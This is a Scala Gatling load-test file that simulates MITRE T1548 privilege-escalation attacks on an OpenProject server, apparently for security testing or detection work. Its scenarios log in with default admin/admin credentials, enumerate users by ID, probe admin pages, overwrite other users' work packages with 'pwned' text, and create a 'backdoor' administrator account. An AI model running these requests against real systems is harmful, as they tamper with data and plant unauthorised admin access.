package openproject

import io.gatling.core.Predef._
import io.gatling.http.Predef._
import scala.concurrent.duration._

class T1548_PrivilegeEscalationSimulation extends Simulation {

  val baseUrl = sys.props.getOrElse("baseUrl", "http://localhost:8080")
  val attackDuration = sys.props.getOrElse("duration", "180").toInt.seconds

  val httpProtocol = http
    .baseUrl(baseUrl)
    .acceptHeader("application/json")
    .userAgentHeader("Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0")
    .disableFollowRedirect

  // --- Scenario 1: IDOR - User enumeration ---
  val idorUserEnum = scenario("T1548 - IDOR User Enumeration")
    // First authenticate as a regular user
    .exec(http("PrivEsc - Login Page").get("/login").check(status.in(200, 302)))
    .pause(500.milliseconds)
    .exec(http("PrivEsc - Login").post("/login")
      .formParam("username", "admin")
      .formParam("password", "admin")
      .check(status.in(200, 302, 401, 422)))
    .pause(1.second)
    // Enumerate user IDs sequentially
    .repeat(50, "userId") {
      exec(http("IDOR - Get User #{userId}")
        .get("/api/v3/users/#{userId}")
        .check(status.in(200, 301, 302, 403, 404)))
      .pause(200.milliseconds, 500.milliseconds)
    }

  // --- Scenario 2: Admin panel access attempts ---
  val adminAccess = scenario("T1548 - Admin Access")
    .exec(http("PrivEsc - Login Page").get("/login").check(status.in(200, 302)))
    .pause(500.milliseconds)
    .exec(http("PrivEsc - Login").post("/login")
      .formParam("username", "admin")
      .formParam("password", "admin")
      .check(status.in(200, 302, 401, 422)))
    .pause(1.second)
    .exec(http("Admin - Dashboard").get("/admin").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Users List").get("/admin/users").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Settings").get("/admin/settings").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Auth Settings").get("/admin/settings/authentication").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Plugins").get("/admin/plugins").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Info").get("/admin/info").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Roles").get("/admin/roles").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Groups").get("/admin/groups").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Custom Fields").get("/admin/custom_fields").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Enterprise").get("/admin/enterprise").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("Admin - Enumerations").get("/admin/enumerations").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)

  // --- Scenario 3: Cross-user work package modification ---
  val crossUserModify = scenario("T1548 - Cross-User WP Modify")
    .exec(http("PrivEsc - Login Page").get("/login").check(status.in(200, 302)))
    .pause(500.milliseconds)
    .exec(http("PrivEsc - Login").post("/login")
      .formParam("username", "admin")
      .formParam("password", "admin")
      .check(status.in(200, 302, 401, 422)))
    .pause(1.second)
    // Try to PATCH work packages belonging to other users
    .repeat(20, "wpId") {
      exec(http("IDOR - Patch WP #{wpId}")
        .patch("/api/v3/work_packages/#{wpId}")
        .header("Content-Type", "application/json")
        .body(StringBody("""{"subject":"pwned","description":{"raw":"Modified by attacker"}}"""))
        .check(status.in(200, 301, 302, 400, 403, 404, 409, 422)))
      .pause(300.milliseconds, 700.milliseconds)
    }

  // --- Scenario 4: Self-promotion / Role manipulation ---
  val roleManipulation = scenario("T1548 - Role Manipulation")
    .exec(http("PrivEsc - Login Page").get("/login").check(status.in(200, 302)))
    .pause(500.milliseconds)
    .exec(http("PrivEsc - Login").post("/login")
      .formParam("username", "admin")
      .formParam("password", "admin")
      .check(status.in(200, 302, 401, 422)))
    .pause(1.second)
    // Try to promote self to admin
    .exec(http("PrivEsc - Self Admin PATCH")
      .patch("/api/v3/users/2")
      .header("Content-Type", "application/json")
      .body(StringBody("""{"admin":true,"status":"active"}"""))
      .check(status.in(200, 301, 302, 400, 403, 404, 422)))
    .pause(1.second)
    // Try to create new admin user
    .exec(http("PrivEsc - Create Admin User")
      .post("/api/v3/users")
      .header("Content-Type", "application/json")
      .body(StringBody("""{"login":"backdoor","email":"backdoor@evil.com","firstName":"Back","lastName":"Door","admin":true,"password":"Backdoor123!","status":"active"}"""))
      .check(status.in(200, 201, 301, 302, 400, 403, 422)))
    .pause(1.second)
    // Try to modify roles via admin API
    .exec(http("PrivEsc - List Roles API").get("/api/v3/roles").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    // Try to add self to admin group
    .exec(http("PrivEsc - List Groups").get("/api/v3/groups").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    // Try project membership escalation
    .exec(http("PrivEsc - List Memberships").get("/api/v3/memberships").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("PrivEsc - Create Membership")
      .post("/api/v3/memberships")
      .header("Content-Type", "application/json")
      .body(StringBody("""{"_links":{"principal":{"href":"/api/v3/users/2"},"project":{"href":"/api/v3/projects/1"},"roles":[{"href":"/api/v3/roles/3"}]}}"""))
      .check(status.in(200, 201, 301, 302, 400, 403, 422)))
    .pause(1.second)
    // Enumerate API tokens
    .exec(http("PrivEsc - My Account").get("/my/account").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)
    .exec(http("PrivEsc - API Tokens").get("/my/access_token").check(status.in(200, 302, 403)))
    .pause(500.milliseconds)

  setUp(
    idorUserEnum.inject(atOnceUsers(1)),
    adminAccess.inject(nothingFor(3.seconds), atOnceUsers(1)),
    crossUserModify.inject(nothingFor(6.seconds), atOnceUsers(1)),
    roleManipulation.inject(nothingFor(9.seconds), atOnceUsers(1))
  ).protocols(httpProtocol).maxDuration(attackDuration + 30.seconds)
}
